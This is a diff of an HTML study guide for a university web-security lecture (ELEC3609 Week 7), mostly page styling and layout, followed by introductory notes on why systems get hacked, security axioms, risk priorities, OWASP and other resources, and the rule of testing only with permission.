+  .hero-meta{display:flex;flex-wrap:wrap;gap:.55rem;}
+  .meta-chip{display:inline-flex;align-items:center;gap:.4rem;font-size:.8rem;font-weight:600;color:var(--ink-soft);background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:.4rem .8rem;}
+  .meta-chip .dot{width:7px;height:7px;border-radius:50%;background:var(--primary);}
+  .hero-outcomes{margin-top:1.5rem;padding-top:1.3rem;border-top:1px dashed var(--line-strong);}
+  .hero-outcomes h2{font-family:var(--font-body);font-size:.76rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-faint);margin:0 0 .75rem;}
+  .outcome-list{list-style:none;margin:0;padding:0;display:grid;gap:.5rem;}
+  .outcome-list li{position:relative;padding-left:1.7rem;font-size:.95rem;color:var(--ink-soft);}
+  .outcome-list li::before{content:"✓";position:absolute;left:0;top:0;color:var(--primary);font-weight:700;}
+
+  /* ---------- Sections ---------- */
+  .guide-section{margin:0 0 3.4rem;counter-increment:sec;}
+  .content{counter-reset:sec;}
+  .section-head{display:flex;align-items:center;gap:.9rem;margin:0 0 .55rem;}
+  .sec-num{
+    flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center;
+    min-width:42px;height:42px;padding:0 .3rem;border-radius:12px;
+    background:var(--primary-soft);color:var(--primary-deep);
+    font-family:var(--font-display);font-weight:600;font-size:1.05rem;
+  }
+  .sec-num::before{content:counter(sec,decimal-leading-zero);}
+  .section-title{font-family:var(--font-display);font-weight:600;font-size:clamp(1.35rem,2.4vw,1.72rem);line-height:1.2;letter-spacing:-.015em;margin:0;color:var(--ink);}
+  .section-kicker{
+    font-size:1.02rem;color:var(--ink-soft);font-style:italic;
+    border-left:3px solid var(--accent);padding-left:.9rem;margin:.2rem 0 1.6rem;
+  }
+  .sub-title{font-family:var(--font-body);font-weight:700;font-size:1.08rem;letter-spacing:-.005em;margin:2rem 0 .7rem;color:var(--ink);display:flex;align-items:center;gap:.5rem;}
+  .sub-title::before{content:"";width:14px;height:3px;border-radius:2px;background:var(--accent);flex:0 0 auto;}
+  .sub-sub{font-weight:700;font-size:.98rem;margin:1.4rem 0 .5rem;color:var(--primary-deep);}
+  .lede{font-size:1.06rem;color:var(--ink);}
+  .muted{color:var(--ink-faint);}
+  .divider{height:1px;background:var(--line);border:0;margin:1.8rem 0;}
+
+  ul,ol{margin:0 0 1.1rem;padding-left:1.35rem;}
+  li{margin:.32rem 0;}
+  li::marker{color:var(--primary);}
+  ol li::marker{font-weight:600;color:var(--accent);}
+
+  /* Inline highlights */
+  .keyterm{font-weight:650;color:var(--primary-deep);}
+  .hl{background:var(--gold-soft);padding:0 .25rem;border-radius:4px;}
+  code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-3);padding:.12em .4em;border-radius:6px;color:var(--ink);}
+
+  /* ---------- Callouts ---------- */
+  .callout{
+    display:flex;gap:.85rem;align-items:flex-start;
+    border:1px solid var(--c-line);background:var(--c-bg);color:var(--ink);
+    border-radius:var(--radius-sm);padding:.95rem 1.1rem;margin:1.2rem 0;
+  }
+  .callout-icon{font-size:1.15rem;line-height:1.5;flex:0 0 auto;}
+  .callout-body{font-size:.95rem;}
+  .callout-body strong:first-child{color:var(--c-fg);}
+  .c-info{--c-bg:var(--c-info-bg);--c-line:var(--c-info-line);--c-fg:var(--c-info-fg);}
+  .c-why{--c-bg:var(--c-why-bg);--c-line:var(--c-why-line);--c-fg:var(--c-why-fg);}
+  .c-memory{--c-bg:var(--c-memory-bg);--c-line:var(--c-memory-line);--c-fg:var(--c-memory-fg);}
+  .c-tip{--c-bg:var(--c-tip-bg);--c-line:var(--c-tip-line);--c-fg:var(--c-tip-fg);}
+  .c-warn{--c-bg:var(--c-warn-bg);--c-line:var(--c-warn-line);--c-fg:var(--c-warn-fg);}
+
+  .reflect{
+    display:flex;gap:.85rem;align-items:flex-start;
+    border:1.5px dashed var(--line-strong);border-left:4px solid var(--accent);
+    background:var(--surface-2);border-radius:var(--radius-sm);
+    padding:.9rem 1.1rem;margin:1.2rem 0;font-size:.95rem;color:var(--ink-soft);
+  }
+  .reflect .ri{font-size:1.15rem;flex:0 0 auto;}
+  .reflect strong{color:var(--accent);}
+
+  /* ---------- Cards & grids ---------- */
+  .grid{display:grid;gap:1rem;margin:1.2rem 0;}
+  .grid-2{grid-template-columns:repeat(auto-fit,minmax(240px,1fr));}
+  .grid-3{grid-template-columns:repeat(auto-fit,minmax(190px,1fr));}
+  .card{
+    background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);
+    padding:1.15rem 1.25rem;box-shadow:var(--shadow-sm);transition:.2s var(--ease);
+  }
+  .card:hover{box-shadow:var(--shadow);transform:translateY(-2px);}
+  .card-title{font-family:var(--font-body);font-weight:700;font-size:1rem;margin:0 0 .5rem;color:var(--ink);display:flex;align-items:center;gap:.5rem;}
+  .card p:last-child,.card ul:last-child,.card ol:last-child{margin-bottom:0;}
+  .card .tag{font-size:.68rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--primary-deep);background:var(--primary-soft);padding:.15rem .5rem;border-radius:999px;}
+
+  .def-card{background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--primary);border-radius:var(--radius-sm);padding:.9rem 1.1rem;margin:1rem 0;}
+  .def-card .dc-term{font-weight:700;color:var(--primary-deep);}
+
+  /* ---------- Tables ---------- */
+  .table-wrap{overflow-x:auto;margin:1.3rem 0;border:1px solid var(--line);border-radius:var(--radius);background:var(--surface);box-shadow:var(--shadow-sm);}
+  table{width:100%;border-collapse:collapse;font-size:.92rem;}
+  thead th{background:var(--surface-3);color:var(--ink);text-align:left;font-weight:700;padding:.8rem .95rem;border-bottom:1px solid var(--line-strong);white-space:nowrap;}
+  tbody td{padding:.75rem .95rem;border-bottom:1px solid var(--line);vertical-align:top;color:var(--ink-soft);}
+  tbody tr:last-child td{border-bottom:0;}
+  tbody tr:nth-child(even){background:var(--surface-2);}
+  td strong{color:var(--ink);}
+
+  /* ---------- Formula ---------- */
+  .formula{background:var(--surface-3);border:1px solid var(--line);border-radius:var(--radius-sm);padding:1rem 1.2rem;margin:1.2rem 0;text-align:center;}
+  .formula-label{font-size:.72rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-faint);margin-bottom:.45rem;}
+  .math{font-family:var(--font-mono);font-size:1.02rem;color:var(--ink);}
+
+  /* ---------- Flow / steps ---------- */
+  .steps{list-style:none;margin:1.2rem 0;padding:0;counter-reset:step;}
+  .steps li{position:relative;padding:.1rem 0 .95rem 2.6rem;counter-increment:step;color:var(--ink-soft);}
+  .steps li::before{
+    content:counter(step);position:absolute;left:0;top:-.1rem;
+    width:1.85rem;height:1.85rem;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    background:var(--primary-soft);color:var(--primary-deep);font-weight:700;font-size:.85rem;
+  }
+  .steps li:not(:last-child)::after{content:"";position:absolute;left:.9rem;top:1.85rem;bottom:.1rem;width:2px;background:var(--line);}
+  .steps li strong{color:var(--ink);}
+
+  .flow{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;margin:1.2rem 0;}
+  .flow-step{background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:.5rem .95rem;font-size:.86rem;font-weight:600;color:var(--ink);box-shadow:var(--shadow-sm);}
+  .flow-arrow{color:var(--accent);font-weight:700;}
+
+  /* ---------- Compare ---------- */
+  .compare{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem;margin:1.2rem 0;}
+  .compare-col{border:1px solid var(--line);border-radius:var(--radius);padding:1rem 1.15rem;background:var(--surface);}
+  .compare-col h3,.compare-col h4{margin:0 0 .55rem;font-size:.95rem;color:var(--ink);}
+  .compare-col.a{border-top:3px solid var(--primary);}
+  .compare-col.b{border-top:3px solid var(--accent);}
+
+  /* ---------- Mnemonic ---------- */
+  .mnemonic{background:linear-gradient(160deg,var(--violet-soft),var(--surface));border:1px solid var(--violet-soft);border-radius:var(--radius);padding:1.2rem 1.3rem;margin:1.2rem 0;text-align:center;}
+  .mnemonic-letters{font-family:var(--font-display);font-size:1.5rem;font-weight:700;letter-spacing:.28em;color:var(--violet);margin-bottom:.35rem;}
+  .mnemonic-phrase{font-style:italic;font-weight:600;color:var(--ink);margin-bottom:.35rem;}
+  .mnemonic-expand{font-size:.88rem;color:var(--ink-soft);}
+
+  /* ---------- Quiz ---------- */
+  .quiz-toolbar{display:flex;flex-wrap:wrap;align-items:center;gap:.6rem;background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:.85rem 1rem;margin:1.4rem 0;box-shadow:var(--shadow-sm);}
+  .quiz-toolbar .progress-copy{margin-right:auto;font-size:.88rem;font-weight:600;color:var(--ink-soft);}
+  .btn{border:1px solid var(--line-strong);background:var(--surface);color:var(--ink);border-radius:999px;padding:.42rem .9rem;font-family:inherit;font-size:.82rem;font-weight:600;cursor:pointer;transition:.16s var(--ease);}
+  .btn:hover{background:var(--surface-2);transform:translateY(-1px);}
+  .btn-primary{background:var(--primary);border-color:var(--primary);color:#fff;}
+  .btn-primary:hover{background:var(--primary-deep);}
+
+  .quiz{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);margin:1rem 0;overflow:hidden;box-shadow:var(--shadow-sm);transition:.2s var(--ease);}
+  .quiz:hover{box-shadow:var(--shadow);}
+  .quiz-head{display:flex;gap:.85rem;align-items:flex-start;padding:1rem 1.15rem;}
+  .quiz-qnum{flex:0 0 auto;font-family:var(--font-display);font-weight:700;font-size:.95rem;color:var(--accent);padding-top:.15rem;}
+  .quiz-q{font-weight:600;color:var(--ink);}
+  .quiz-answer{display:none;padding:0 1.15rem 1rem 3.6rem;font-size:.94rem;color:var(--ink-soft);border-top:1px dashed var(--line);margin-top:0;padding-top:.9rem;}
+  .quiz.open .quiz-answer{display:block;}
+  .quiz-answer strong{color:var(--primary-deep);}
+  .quiz-actions{display:flex;align-items:center;gap:1rem;padding:0 1.15rem 1rem 3.6rem;}
+  .quiz-reveal{background:none;border:0;color:var(--primary-deep);font-family:inherit;font-size:.83rem;font-weight:600;cursor:pointer;padding:0;}
+  .quiz-reveal:hover{text-decoration:underline;}
+  .mastered{margin-left:auto;display:inline-flex;align-items:center;gap:.45rem;font-size:.82rem;color:var(--ink-faint);cursor:pointer;user-select:none;}
+  .mastered input{accent-color:var(--primary);width:16px;height:16px;cursor:pointer;}
+  .quiz.done{border-color:var(--primary);background:var(--primary-soft);}
+
+  /* ---------- Takeaways ---------- */
+  .takeaways{margin:1.3rem 0;display:grid;gap:.7rem;}
+  .takeaway{display:flex;gap:.9rem;align-items:flex-start;background:var(--surface);border:1px solid var(--line);border-radius:var(--radius-sm);padding:.85rem 1.05rem;box-shadow:var(--shadow-sm);}
+  .tk-num{flex:0 0 auto;width:1.6rem;height:1.6rem;border-radius:50%;background:var(--primary);color:#fff;font-size:.78rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .takeaway p{margin:0;font-size:.94rem;color:var(--ink-soft);}
+  .takeaway strong{color:var(--ink);}
+
+  /* ---------- Glossary ---------- */
+  .glossary-tools{display:flex;flex-wrap:wrap;gap:.45rem;margin:1.2rem 0;}
+  .chip{border:1px solid var(--line-strong);background:var(--surface);border-radius:999px;padding:.36rem .85rem;font-family:inherit;font-size:.8rem;font-weight:600;color:var(--ink-soft);cursor:pointer;transition:.16s var(--ease);}
+  .chip:hover{background:var(--surface-2);}
+  .chip.active{background:var(--primary);border-color:var(--primary);color:#fff;}
+  .terms{display:grid;gap:.8rem;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));}
+  .term-card{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius-sm);padding:.85rem 1rem;box-shadow:var(--shadow-sm);}
+  .term-card.hidden{display:none;}
+  .term-name{font-weight:700;color:var(--primary-deep);font-size:.95rem;margin-bottom:.2rem;}
+  .term-meaning{font-size:.88rem;color:var(--ink-soft);line-height:1.6;}
+  .empty-note{color:var(--ink-faint);font-size:.9rem;display:none;}
+
+  /* ---------- Checklist ---------- */
+  .checklist{display:grid;gap:.5rem;margin:1.2rem 0;}
+  .check-item{display:flex;gap:.7rem;align-items:flex-start;background:var(--surface);border:1px solid var(--line);border-radius:var(--radius-sm);padding:.7rem .95rem;font-size:.92rem;color:var(--ink-soft);cursor:pointer;}
+  .check-item input{margin-top:.28rem;accent-color:var(--primary);width:16px;height:16px;flex:0 0 auto;cursor:pointer;}
+  .check-item:has(input:checked){background:var(--primary-soft);border-color:var(--primary);color:var(--ink);}
+
+  /* ---------- Footer ---------- */
+  .site-footer{max-width:1280px;margin:0 auto;padding:2.2rem clamp(.9rem,3vw,2rem) 3.4rem;border-top:1px solid var(--line);color:var(--ink-faint);font-size:.84rem;}
+  .footer-nav{display:flex;flex-wrap:wrap;gap:.7rem;justify-content:space-between;margin-bottom:1.2rem;}
+  .footer-nav a{display:inline-flex;align-items:center;gap:.45rem;background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:.55rem 1rem;font-weight:600;color:var(--ink-soft);font-size:.85rem;transition:.16s var(--ease);}
+  .footer-nav a:hover{border-color:var(--primary);color:var(--primary-deep);text-decoration:none;transform:translateY(-1px);}
+  .footer-nav .spacer{flex:1;}
+  .to-top{position:fixed;right:1.2rem;bottom:1.2rem;z-index:90;width:44px;height:44px;border-radius:50%;border:1px solid var(--line);background:var(--surface);color:var(--ink-soft);font-size:1.1rem;cursor:pointer;box-shadow:var(--shadow);opacity:0;pointer-events:none;transition:.25s var(--ease);}
+  .to-top.show{opacity:1;pointer-events:auto;}
+  .to-top:hover{color:var(--primary-deep);transform:translateY(-2px);}
+
+  /* ---------- Responsive ---------- */
+  @media (max-width:980px){
+    .layout{grid-template-columns:1fr;}
+    .menu-toggle{display:inline-flex;}
+    .sidebar{
+      position:fixed;top:0;left:0;z-index:130;height:100vh;width:min(86vw,320px);
+      background:var(--surface);border-right:1px solid var(--line);padding:4.4rem 1.1rem 2rem;
+      transform:translateX(-104%);transition:transform .28s var(--ease);box-shadow:var(--shadow-lg);
+    }
+    body.nav-open .sidebar{transform:translateX(0);}
+    .scrim{display:block;position:fixed;inset:0;background:rgba(30,25,20,.42);z-index:125;opacity:0;pointer-events:none;transition:opacity .25s var(--ease);}
+    body.nav-open .scrim{opacity:1;pointer-events:auto;}
+    .content{padding-top:1.6rem;}
+  }
+  @media (max-width:600px){
+    body{font-size:16px;}
+    .search input{width:44vw;}
+    .brand-week{display:none;}
+    .hero{padding:1.4rem;}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation-duration:.001ms !important;transition-duration:.001ms !important;}
+    html{scroll-behavior:auto;}
+  }
+
+  /* ---------- Code blocks (added for ELEC3609) ---------- */
+  .code-block{position:relative;margin:1.2rem 0;}
+  .code-block pre{margin:0;background:var(--surface-3);border:1px solid var(--line);border-radius:var(--radius-sm);padding:1rem 1.1rem;overflow:auto;}
+  .code-block code{font-family:var(--font-mono);font-size:.84rem;line-height:1.62;background:none;padding:0;border-radius:0;color:var(--ink);white-space:pre;}
+  .code-copy{position:absolute;top:.55rem;right:.55rem;font-family:var(--font-body);font-size:.68rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-faint);background:var(--surface);border:1px solid var(--line);border-radius:7px;padding:.25rem .55rem;cursor:pointer;transition:.16s var(--ease);}
+  .code-copy:hover{color:var(--primary-deep);border-color:var(--line-strong);}
+  .code-copy.done{color:var(--primary-deep);border-color:var(--primary);}
 </style>
 </head>
 <body>
-<div class="progress" id="progress" aria-hidden="true"></div>
+<a class="skip-link" href="#content">Skip to content</a>
+<div class="progress-track" aria-hidden="true"><div class="progress-fill" id="progressFill"></div></div>
+
 <header class="topbar">
-  <button class="icon-btn menu-btn" id="menuBtn" type="button" aria-label="Open navigation">☰</button>
-  <div class="brand"><span class="brand-badge">ELEC3609 · Week 7</span><span class="brand-title">Web Security &amp; Vulnerability Mitigation · 2025 Session</span></div>
-  <div class="topbar-actions">
+  <button class="icon-btn menu-toggle" id="menuToggle" aria-label="Open navigation" aria-expanded="false">☰</button>
+  <a class="brand" href="../../../index.html">
+    <span class="brand-course">ELEC3609</span>
+    <span class="brand-week">Week 7</span>
+  </a>
+  <div class="topbar-tools">
     <div class="search">
-      <input id="searchInput" type="search" placeholder="Search this guide…" autocomplete="off" aria-label="Search this guide">
-      <div class="search-results" id="searchResults" role="listbox"></div>
+      <span class="search-icon" aria-hidden="true">⌕</span>
+      <input id="searchInput" type="search" placeholder="Search guide…" aria-label="Search this study guide" autocomplete="off">
+      <div class="suggest" id="suggest" role="listbox" aria-label="Search results"></div>
     </div>
-    <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle light and dark theme">🌙</button>
-    <button class="icon-btn" id="printBtn" type="button" aria-label="Print this guide">🖨</button>
+    <button class="icon-btn" id="themeToggle" aria-label="Toggle night mode" title="Toggle night mode">◐</button>
   </div>
 </header>
-<div class="shell">
+
+<div class="layout">
   <aside class="sidebar" id="sidebar" aria-label="Table of contents">
-    <p class="toc-title">Contents</p>
-    <ul class="toc">
-<li><a href="#overview" class="toc-link"><span class="toc-n">00</span>Overview</a></li>
-<li><a href="#sec-1" class="toc-link"><span class="toc-n">01</span>Getting Hacked – Why Systems Fail</a></li>
-<li><a href="#sec-2" class="toc-link"><span class="toc-n">02</span>Axioms &amp; Risk Priorities</a></li>
-<li><a href="#sec-3" class="toc-link"><span class="toc-n">03</span>Security Resources &amp; Legal Rules</a></li>
-<li><a href="#sec-4" class="toc-link"><span class="toc-n">04</span>Web Vulnerabilities Overview</a></li>
-<li><a href="#sec-5" class="toc-link"><span class="toc-n">05</span>SQL Injection (SQLi)</a></li>
-<li><a href="#sec-6" class="toc-link"><span class="toc-n">06</span>Cross-Site Scripting (XSS)</a></li>
-<li><a href="#sec-7" class="toc-link"><span class="toc-n">07</span>Cross-Site Request Forgery (CSRF)</a></li>
-<li><a href="#sec-8" class="toc-link"><span class="toc-n">08</span>Authentication &amp; Password Storage</a></li>
-<li><a href="#sec-9" class="toc-link"><span class="toc-n">09</span>Hashing, Cracking &amp; Salting</a></li>
-<li><a href="#sec-10" class="toc-link"><span class="toc-n">10</span>Auth Tokens &amp; Cookie Security</a></li>
-<li><a href="#sec-11" class="toc-link"><span class="toc-n">11</span>Local &amp; Remote File Inclusion</a></li>
-<li><a href="#sec-12" class="toc-link"><span class="toc-n">12</span>Remote Code Execution (RCE)</a></li>
-<li><a href="#sec-13" class="toc-link"><span class="toc-n">13</span>Denial of Service (DDoS)</a></li>
-<li><a href="#sec-14" class="toc-link"><span class="toc-n">14</span>Real-World Case Studies</a></li>
-<li><a href="#key-takeaways" class="toc-link"><span class="toc-n">15</span>Key Takeaways</a></li>
-<li><a href="#glossary" class="toc-link"><span class="toc-n">16</span>Glossary</a></li>
-<li><a href="#mnemonics" class="toc-link"><span class="toc-n">17</span>Mnemonics &amp; Quick Recall</a></li>
-<li><a href="#worked-examples" class="toc-link"><span class="toc-n">18</span>Worked Examples &amp; Scenarios</a></li>
-<li><a href="#exam-focus" class="toc-link"><span class="toc-n">19</span>Exam Practice</a></li>
-    </ul>
+    <div class="sidebar-inner">
+      <div class="sidebar-progress">
+        <div class="sidebar-progress-label"><span>Recall progress</span><span id="masteryLabel">0 / 0</span></div>
+        <div class="bar"><div class="bar-fill" id="masteryFill"></div></div>
+      </div>
+      <p class="toc-title">On this page</p>
+      <nav class="toc" id="toc"></nav>
+      <div class="sidebar-links">
+        <a href="#takeaways">★ Key takeaways</a>
+        <a href="#glossary">▦ Glossary</a>
+        <a href="#practice">✎ Practice questions</a>
+        <a href="#checklist">☑ Confidence check</a>
+      </div>
+    </div>
   </aside>
-  <div class="scrim" id="scrim"></div>
+  <div class="scrim" id="scrim" hidden></div>
+
   <main class="content" id="content">
-<section class="hero" id="overview">
-<p class="hero-tag">📖 Course notes · Week 7</p>
-<h1>Web Security &amp; Vulnerability Mitigation · 2025 Session</h1>
-<p class="hero-sub">This lecture explains how websites get hacked, the mindset that causes security failures, and the major classes of web attack: SQL injection, cross-site…</p>
-<div class="hero-overview"><p class="ho-label">Lecture overview</p><p>This lecture explains how websites get hacked, the mindset that causes security failures, and the major classes of web attack: SQL injection, cross-site scripting, cross-site request forgery, file inclusion, remote code execution, and denial of service. It then covers how authentication, password storage, hashing, salting, tokens and cookies actually work, so you can defend them. Finally, it walks through real-world breaches that came from surprisingly basic mistakes. It is the security counterpart to the web-platform material earlier in the unit: once you can build a site, you must know how attackers break it.</p></div>
-<div class="stats"><div class="stat"><span class="stat-val">1</span><span class="stat-label">Lectures</span></div><div class="stat"><span class="stat-val">SQLi, XSS, CSRF, LFI/RFI, RCE, DDoS</span><span class="stat-label">Core Vulnerabilities</span></div><div class="stat"><span class="stat-val">Over 160,000</span><span class="stat-label">Tracked CVEs</span></div><div class="stat"><span class="stat-val">OWASP (Top 10 list)</span><span class="stat-label">Security Body</span></div><div class="stat"><span class="stat-val">macOS, Steam, MySpace, GitHub, vBulletin</span><span class="stat-label">Real Case Studies</span></div></div>
+<section class="hero" id="top">
+  <span class="hero-eyebrow">ELEC3609 · Week 7 · Web Security</span>
+  <h1 class="hero-title">Web Security: How Sites Get Hacked and How We Defend Them</h1>
+  <p class="hero-sub">A tour of the attacks that break real websites — SQL injection, cross-site scripting, CSRF, file inclusion, remote code execution and DDoS — and the defensive techniques that stop them: input sanitisation, output escaping, CSRF tokens, password hashing, salting and safe authentication cookies.</p>
+  <div class="hero-lead"><strong>Read this first:</strong> Every web vulnerability in this week follows one pattern — a program trusts data it should not trust. If you can spot the exact place where untrusted input (a URL parameter, a form field, a cookie) flows into something powerful (a database query, the browser's HTML parser, the filesystem, <code>eval()</code>), you can predict the attack <em>and</em> the fix. Keep that single idea in mind: <span class="hl">never trust input; validate, escape, and authenticate</span>.</div>
+  <div class="hero-meta"><span class="meta-chip">~26 min read</span><span class="meta-chip">14 teaching sections</span><span class="meta-chip">14 practice questions</span><span class="meta-chip">24 key terms</span></div>
+  <div class="hero-outcomes">
+    <h2>By the end you will be able to</h2>
+    <ul class="outcome-list"><li>Explain why web applications get hacked and describe the two broad classes of attack (server-side vs user-side).</li><li>Recognise and exploit the mechanics of SQL injection, XSS, CSRF, LFI/RFI and RCE on a vulnerable example.</li><li>Apply the correct defences — input sanitisation, HTML escaping, CSRF tokens and parameterised queries/ORMs.</li><li>Describe how authentication works across its two stages: logging in and identifying a logged-in session.</li><li>Explain why passwords are stored as hashes and what makes a good hash function (one-way, unpredictable, non-collision).</li><li>Describe dictionary and rainbow-table attacks and explain how salting defeats precomputation.</li><li>Compare stateful and stateless (calculated) authentication tokens and their time/memory trade-offs.</li><li>Harden cookies using HTTPS, the <code>secure</code> attribute and the <code>HttpOnly</code> attribute.</li><li>Recall real-world case studies where empty passwords or missing password checks led to full compromise.</li></ul>
+  </div>
 </section>
-<section class="section" id="sec-1"><header class="section-head"><span class="section-num">01</span><h2>Getting Hacked – Why Systems Fail</h2></header><div class="section-body"><p>Attackers rarely get lucky. Sites get hacked because system designers make predictable mistakes.</p>
-<p><strong>Why systems get hacked</strong> — designers and developers:</p>
-<ul><li><strong>Protect the wrong things</strong> — spend effort on low-risk assets while critical paths stay exposed.</li><li><strong>Protect the right things in the wrong way</strong> — build flawed controls (e.g. stripping <code>&lt;script&gt;</code> tags instead of escaping HTML).</li><li><strong>Make poor assumptions</strong> — assume input is well-formed, internal networks are trusted, or client-side checks cannot be bypassed.</li><li><strong>Fail to understand the threat model</strong> — overlook attacker motivation, resources, and entry points.</li><li><strong>Fail to account for paradigm shifts</strong> — build on legacy assumptions that break on the open Internet.</li><li><strong>Fail to understand system scope</strong> — underestimate the full surface: third-party libraries, servers, and even human operators.</li></ul>
-<p>Web security is genuinely hard. As Michal Zalewski writes in <em>The Tangled Web</em>, modern web applications are a <strong>tangle of technologies</strong> developed over time and haphazardly pieced together. Every part of the stack — from HTTP requests to browser scripts — has subtle security consequences, so developers must navigate the landscape confidently.</p>
-<p><strong>What does "getting hacked" mean?</strong> There are two broad target types:</p>
-<div class="table-wrap"><table><thead><tr><th>Target</th><th>How it is attacked</th><th>Examples</th></tr></thead><tbody><tr><td><strong>Servers</strong></td><td>Manipulating server-side code</td><td>SQL Injection, Remote Code Execution, Local/Remote File Inclusion</td></tr><tr><td><strong>Users</strong></td><td>Altering or intercepting data on the user's computer while they use the site</td><td>Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF)</td></tr></tbody></table></div>
-<p><strong>What can be hacked?</strong> It is not just a product — it is everything around it:</p>
-<ul><li>A <strong>product or component</strong> — software program, cryptographic protocol, smart card.</li><li><strong>Infrastructure</strong> — PC, operating system, communications, routers, DNS, cloud.</li><li><strong>Applications</strong> — web server, payroll system.</li><li>Also: <strong>IT staff</strong>, <strong>users and management</strong>, <strong>customers and external users</strong>, <strong>partners and vendors</strong>.</li></ul>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">Security is not a feature you bolt on at the end — it is a property of the whole system. Recognising that servers <em>and</em> users are targets changes how you design every page.</div></div></div>
-<div class="callout warn"><div class="callout-ico" aria-hidden="true">⚠️</div><div class="callout-body"><p class="callout-title">Common Trap:</p><div class="callout-text">The recurring lesson is blunt: <strong>"It's a lot easier to break a system than to make it secure."</strong> An attacker only needs one flaw; a defender must close them all.</div></div></div></div></section>
-<section class="section" id="sec-2"><header class="section-head"><span class="section-num">02</span><h2>Axioms &amp; Risk Priorities</h2></header><div class="section-body"><p>These axioms are the mental model behind all web security thinking.</p>
-<p><strong>Axioms of Information Security:</strong></p>
-<ul><li><strong>Information security is a resource game</strong> — an arms race between attacker resources and defence costs.</li><li><strong>All systems are buggy</strong> — no non-trivial software is completely bug-free.</li><li><strong>The bigger the system, the buggier it is</strong> — more code and surface area means more flaws.</li><li><strong>Nothing works in isolation</strong> — a weakness in one component can compromise the whole.</li><li><strong>Humans are most often the weakest link</strong> in a system.</li><li><strong>It's a lot easier to break a system than to make it secure</strong> — defenders must fix every flaw, attackers only need one.</li></ul>
-<div class="callout memory"><div class="callout-ico" aria-hidden="true">🧠</div><div class="callout-body"><p class="callout-title">Memory Hook:</p><div class="callout-text"><strong>"Resource, Bugs, Size, Isolation, Humans, Asymmetry"</strong> — six truths that explain almost every breach.</div></div></div>
-<p><strong>Focus on the important risks.</strong> Not every vulnerability deserves equal effort. You must balance three things:</p>
-<ul><li><strong>Likelihood</strong> of the component being exploited.</li><li><strong>Damage</strong> if it is exploited.</li><li><strong>Mitigation cost</strong> to prevent exploitation.</li></ul>
-<p><strong>Severity hierarchy and the management response it demands:</strong></p>
-<div class="table-wrap"><table><thead><tr><th>Level</th><th>Management Action Required</th></tr></thead><tbody><tr><td>1. Severe</td><td>Managed by senior management with a detailed plan</td></tr><tr><td>2. High</td><td>Detailed research and management required at senior levels</td></tr><tr><td>3. Major</td><td>Senior management attention is needed</td></tr><tr><td>4. Significant</td><td>Management responsibility must be specified</td></tr><tr><td>5. Moderate</td><td>Managed by specific monitoring or response procedures</td></tr><tr><td>6. Low</td><td>Managed by routine procedures</td></tr><tr><td>7. Trivial</td><td>Unlikely to need specific application of resources</td></tr></tbody></table></div>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">Limited time and money must go where risk × damage is highest. This is exactly the trade-off a professional security team makes.</div></div></div></div></section>
-<section class="section" id="sec-3"><header class="section-head"><span class="section-num">03</span><h2>Security Resources &amp; Legal Rules</h2></header><div class="section-body"><p><strong>Industry frameworks and databases:</strong></p>
-<ul><li><strong>OWASP</strong> (Open Web Application Security Project) — a global non-profit that provides comprehensive assessment and education on web vulnerabilities, including the authoritative <strong>OWASP Top 10</strong>.</li><li><strong>CVE</strong> (Common Vulnerabilities and Exposures) — a public system tracking known breaches and data leaks; there are <strong>over 160,000 tracked incidents</strong>.</li><li><strong>DVWA</strong> (Damn Vulnerable Web Application) — a very simple web app that demonstrates basic web vulnerabilities for training.</li><li><strong>PentesterLab</strong> — practical tutorials and exercises for learning hacking and penetration-testing skills, including web exploitation.</li></ul>
-<p>There is also <strong>ELEC5616: Computer &amp; Network Security</strong> (offered in Semester 1) within the ECE school if you want to go deeper.</p>
-<p><strong>Ask for permission.</strong> This is the single most important ethical and legal rule:</p>
-<ul><li>The <strong>only</strong> context where these techniques are legal is when the owners and administrators of the network or application have <strong>explicitly permitted</strong> you to test.</li><li>Sound knowledge of these tools opens commercial opportunities — it can be a rewarding career, so don't throw it away doing something stupid.</li></ul>
-<p><strong>Cloud / AWS specifics:</strong></p>
-<ul><li>Cloud providers can prohibit certain security tools, especially those that <strong>scan network port ranges</strong> or send <strong>malicious/malformed traffic</strong>.</li><li>This is usually waived if you <strong>submit a request to scan ahead of time</strong>.</li></ul>
-<div class="callout warn"><div class="callout-ico" aria-hidden="true">⚠️</div><div class="callout-body"><p class="callout-title">Common Trap:</p><div class="callout-text">Running a port scanner against cloud infrastructure you do not own can violate the provider's terms even when you own the account. Pre-approve scans.</div></div></div></div></section>
-<section class="section" id="sec-4"><header class="section-head"><span class="section-num">04</span><h2>Web Vulnerabilities Overview</h2></header><div class="section-body"><p>The <strong>OWASP Top 10</strong> identifies the most widespread vulnerabilities on the internet. This lecture discusses several of them (there are many more):</p>
